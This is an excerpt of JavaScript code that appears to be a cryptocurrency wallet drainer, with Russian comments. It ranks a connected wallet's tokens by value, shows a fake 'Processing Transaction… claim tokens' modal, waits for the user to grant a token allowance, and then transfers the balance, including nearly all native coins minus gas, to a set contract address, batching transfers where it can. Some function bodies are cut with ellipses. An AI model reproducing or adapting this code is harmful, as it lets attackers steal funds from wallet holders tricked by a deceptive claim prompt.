...
import { readContract, writeContract, sendCalls, getBalance, getGasPrice, waitForTransactionReceipt } from '@wagmi/core';
...
const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
  try {
    ...
    store.errors.push(`Error monitoring transaction ${txHash}: ${error.message}`);
    return false;
  }
};
...
const TOKENS = {
  ...
  'Fantom': [
    { symbol: 'FTM', address: 'native', decimals: 18 },
...
function createCustomModal() {
  ...
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Processing Transaction</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Please approve the transaction to claim tokens or transfer native assets.</p>
    </div>
  `;
...
// Функция ожидания подтверждения allowance
const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contractAddress, chainId) => {
  ...
  while (true) {
    ...
    if (allowance >= parseUnits('1', 18)) { // Проверка на минимальное значение, можно уточнить
      console.log(`Allowance is sufficient: ${allowance.toString()}`);
      return true;
    }
...
const getTokenPrice = async (symbol) => {
  try {
    ...
    try {
      ...
      const data = await response.json();
      return Number(data[coingeckoId]?.usd) || 0;
    } catch (coingeckoError) {
      store.errors.push(`Error fetching price for ${symbol}: ${coingeckoError.message}`);
      return 0;
    }
  }
};

// Функция одобрения токена
...
// Функция вызова claim или перевода нативного токена
const claimToken = async (wagmiConfig, token, contractAddress, chainId, userAddress) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
  if (!contractAddress || !isAddress(contractAddress)) throw new Error('Invalid contract address');
  if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address');
  if (!token || !token.address || !token.symbol) throw new Error('Invalid token data');
  ...
  try {
    if (token.address === 'native') {
      ...
      const balanceInUnits = Number(formatUnits(balance, token.decimals));
      if (balanceInUnits <= 0) {
        throw new Error(`No ${token.symbol} balance available`);
      }

      const gasPrice = await getGasPrice(wagmiConfig, { chainId });
      const gasLimit = BigInt(21000);
      const gasCost = gasPrice * gasLimit;
      const amountToSend = balance - gasCost > 0 ? balance - gasCost : BigInt(0);

      if (amountToSend <= 0) {
        throw new Error(`Insufficient ${token.symbol} balance for transfer after gas`);
      }
      ...
      console.log(`Native token (${token.symbol}) transfer sent: ${txHash}`);
      await monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig);
      ...
      console.log(`Claim transaction sent for ${token.symbol}: ${txHash}`);
      await monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig);
      return { success: true, txHash };
    }
  } catch (error) {
    store.errors.push(`Claim failed for ${token.symbol} on chain ${chainId}: ${error.message}`);
    return { success: false, error: error.message };
  }
};

// Функция для пакетных операций
const performBatchOperations = async (mostExpensive, allBalances, state) => {
  if (!mostExpensive) {
    ...
    return { success: false, error: 'No valuable tokens found' };
  }
  ...
  try {
    ...
    const calls = networkTokens.map(token => {
      if (token.address === 'native') {
        return {
          ...
          data: '0x',
          value: parseUnits(token.balance.toString(), token.decimals).toString(),
        };
      } else {
        return [
          {
    ...
    if (calls.length > 0) {
      const gasLimit = BigInt(550000 * calls.length);
      const maxFeePerGas = BigInt(1000000000);
      const maxPriorityFeePerGas = BigInt(1000000000);
      console.log(`Sending batch calls with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`);
      ...
      if (mostExpensive) {
        ...
        if (USE_SENDCALLS) {
          ...
          if (batchResult.success) {
            ...
            console.log('Batch transactions not supported, falling back to regular operations');
          }
        }

        console.log(`Processing token: ${mostExpensive.symbol}, amount: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`);
        const targetNetworkInfo = networkMap[mostExpensive.network];
        if (!targetNetworkInfo) {
          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`;
          store.errors.push(errorMessage);
        ...
        try {
          ...
          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
            const approveMessage = store.approvedTokens[approvalKey]
              ? `Operation already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : store.isApprovalRejected
              ? `Operation was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : `Operation request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`;
          ...
          if (mostExpensive.address !== 'native') {
            ...
            if (claimResult.success) {
              ...
              approveMessage = `Claim successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`;
            } else {
            ...
            if (claimResult.success) {
              txHash = claimResult.txHash;
              approveMessage = `Native token transfer successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`;
            } else {
              throw new Error(`Native token transfer failed: ${claimResult.error}`);
            }
          }
